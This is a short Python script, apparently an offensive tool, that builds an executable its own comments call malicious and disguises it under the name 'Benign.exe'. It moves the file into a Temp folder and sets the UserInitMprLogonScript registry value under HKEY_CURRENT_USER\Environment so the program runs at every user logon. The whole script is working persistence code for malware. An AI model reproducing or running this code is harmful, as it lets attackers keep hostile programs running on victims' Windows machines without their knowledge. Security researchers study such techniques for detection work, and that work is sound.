import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "Benign.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildEXe to creat malicious executable
os.system("python Building.py")

# Move malicious executable to desired directory
shutil.move(filename,filedir)


# Windows Logon script keys
reghive = winreg.HKEY_CURRENT_USER
regpath = "Environment"

# reghive = winreg.HKEY_USERS


# Add registry Logon script
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)

